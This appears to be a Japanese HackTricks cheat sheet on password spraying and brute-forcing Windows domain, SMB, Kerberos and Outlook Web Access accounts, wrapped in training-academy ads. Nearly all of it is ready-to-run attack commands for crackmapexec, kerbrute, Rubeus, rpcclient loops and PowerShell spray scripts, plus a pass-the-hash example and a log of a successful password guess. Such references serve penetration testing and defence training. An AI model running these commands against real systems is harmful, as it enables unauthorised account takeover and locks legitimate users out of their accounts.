# パスワードスプレイング / ブルートフォース

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>

**モバイルセキュリティ**の専門知識を深めるために、8kSecアカデミーで学びましょう。自己ペースのコースを通じてiOSとAndroidのセキュリティをマスターし、認定を取得しましょう：

{% embed url="https://academy.8ksec.io/" %}

## **パスワードスプレイング**

いくつかの**有効なユーザー名**を見つけたら、発見した各ユーザーに対して最も**一般的なパスワード**を試すことができます（環境のパスワードポリシーを考慮してください）。\
**デフォルト**では、**最小****パスワード****長**は**7**です。

一般的なユーザー名のリストも役立つかもしれません：[https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

いくつかの間違ったパスワードを試すと**アカウントがロックアウトされる可能性があることに注意してください**（デフォルトでは10回以上）。

### パスワードポリシーを取得する

ユーザーの資格情報やドメインユーザーとしてのシェルがある場合、**次のコマンドでパスワードポリシーを取得できます**：
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Linuxからの悪用（またはすべて）

- **crackmapexec**を使用して：
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- [**kerbrute**](https://github.com/ropnop/kerbrute)（Go）を使用して
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(ロックアウトを避けるために試行回数を指定できます):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute)（python）を使用 - 推奨されません。時々機能しないことがあります。
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- **Metasploit**の`scanner/smb/smb_login`モジュールを使用して:

![](<../../images/image (745).png>)

- **rpcclient**を使用して:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Windowsから

- [Rubeus](https://github.com/Zer1t0/Rubeus)のブルートモジュールを使用したバージョン:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) を使用すると（デフォルトでドメインからユーザーを生成し、ドメインからパスワードポリシーを取得し、それに応じて試行回数を制限します）：
```powershell
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1) を使用して
```
Invoke-SprayEmptyPassword
```
## ブルートフォース
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
## Outlook Web Access

Outlookに対するp**assword spraying**のための複数のツールがあります。

- [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- [Ruler](https://github.com/sensepost/ruler) (信頼性あり!)
- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

これらのツールを使用するには、ユーザーリストとパスワード / 小さなパスワードリストが必要です。
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)

<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>

**モバイルセキュリティ**の専門知識を8kSecアカデミーで深めましょう。自己ペースのコースを通じてiOSとAndroidのセキュリティをマスターし、認定を取得しましょう：

{% embed url="https://academy.8ksec.io/" %}

{{#include ../../banners/hacktricks-training.md}}
